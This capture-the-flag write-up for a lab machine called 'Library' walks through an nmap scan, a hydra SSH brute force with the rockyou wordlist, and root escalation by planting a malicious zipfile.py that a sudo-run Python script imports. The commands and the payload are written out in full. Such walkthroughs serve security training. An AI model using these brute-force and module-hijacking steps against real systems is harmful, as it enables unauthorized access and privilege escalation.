# Library
Enumerating the server with `nmap` reveals:
```
➜  ~ nmap -p- 10.10.38.99
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-17 11:43 CET
Nmap scan report for 10.10.38.99
Host is up (0.055s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 64.26 seconds
```

If we go to the webserver we see a blog wit a single post and 3 comments.
The users who made the comments are `root`, `www-data` and `meliodas`.
If we check `robots.txt` we see:
```
User-agent: rockyou
Disallow: /
```
Seems like we should try brute forcing some ssh credentials with the rockyou wordlist.
Running `hydra` against the ssh service with the user `meliodas` is successful.
```
➜  ~ hydra -l meliodas -P ~/KaliLists/rockyou.txt 10.10.38.99 -t 4 ssh -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 11:57:35
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.38.99:22/
[ATTEMPT] target 10.10.38.99 - login "meliodas" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.38.99 - login "meliodas" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.38.99 - login "meliodas" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
.
.
.
[ATTEMPT] target 10.10.38.99 - login "meliodas" - pass "<redacted>" - 234 of 14344399 [child 3] (0/0)
[22][ssh] host: 10.10.38.99   login: meliodas   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 12:05:45
```

We can now login to the ssh service and read the user flag:
```
➜  ~ ssh meliodas@10.10.38.99
The authenticity of host '10.10.38.99 (10.10.38.99)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes      
Warning: Permanently added '10.10.38.99' (ECDSA) to the list of known hosts.
meliodas@10.10.38.99's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ cat user.txt
<redacted>
```
For escalading privileges we run `sudo -l` to check if with can run anything as sudo.
Lo and behold we can run a `python` script!
```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
Lets have a look at the script:
```
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
Nothing too fancy, but we load the module `zipfile`.
Since we can write to the directory of the script, we can do some library hijacking.
Due to pythons module load order, modules in the same directory as the python script (in this case `/home/meliodas`), will be loaded first.
So if we make a module called `zipfile` in `/home/meliodas` that will be loaded instead of the intended one.
There's a function call to `zipfile.ZipFile`, so if we make a module with that function and have it spawn a shell, we'll get root access.
Let's now make a file called `zipfile.py` in `/home/meliodas` with the contents:
```
import os

ZIP_DEFLATED = "" # Attribute needs to be defined for function to be called 

def ZipFile(a,b,c):
  os.system("/bin/bash")
```
Running the backup script as sudo now grants us a root shell:
```
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# cat /root/root.txt
<redacted>
```
